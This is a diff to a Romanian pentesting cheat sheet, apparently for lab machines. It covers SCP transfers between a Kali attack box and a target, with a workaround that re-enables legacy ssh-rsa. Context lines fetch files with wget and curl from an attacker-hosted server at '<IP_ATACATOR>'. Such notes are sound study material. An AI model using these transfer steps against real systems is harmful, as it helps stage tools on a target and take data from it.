@@ -201,10 +201,29 @@ python3 -m http.server 8000
 * **Cu Wget:** `wget http://<IP_ATACATOR>:8000/fisier.ext`
 * **Cu Curl:** `curl http://<IP_ATACATOR>:8000/fisier.ext -o fisier.ext`
 
-### SCP (Secure Copy) cu suport Legacy
-Folosit pentru a copia directoare întregi prin SSH, forțând algoritmi vechi dacă serverul de laborator este învechit:
+### SCP (Secure Copy)
+Folosit pentru a copia fișiere și directoare întregi în siguranță între mașina de atac și serverul țintă, utilizând conexiunea SSH existentă.
+
+* **Comanda de bază (Pentru a descărca un folder întreg de pe server pe Kali):**
+  ```bash
+  scp -r <username>@<IP_TINTA>:/cale/catre/folder_server /cale/destinatie/local_kali
+  ```
+
+* **Comanda de bază (Pentru a urca un fișier de pe Kali pe server):**
+  ```bash
+  scp /cale/fisier_local <username>@<IP_TINTA>:/cale/destinatie/server
+  ```
+
+#### ⚙️ Flag-uri utilizate:
+* `-r` : Copiază recursiv (obligatoriu dacă vrei să transferi directoare întregi cu tot cu fișierele din ele).
+
+#### ⚠️ Depanare: Conexiune respinsă pe mașini vechi (Legacy Systems)
+Dacă mașina de laborator este învechită, este foarte probabil ca utilitarul `scp` modern de pe Kali să refuze conexiunea cu eroarea: *„no matching host key type found. Their offer: ssh-rsa”*. 
+
+Pentru a debloca transferul, forțează activarea algoritmilor criptografici legacy adăugând manual următoarele opțiuni:
+
 ```bash
-scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -r user@<IP_TINTA>:/cale/server /cale/local/
+scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -r <username>@<IP_TINTA>:/cale/server /cale/local/
 ```
 
 ---
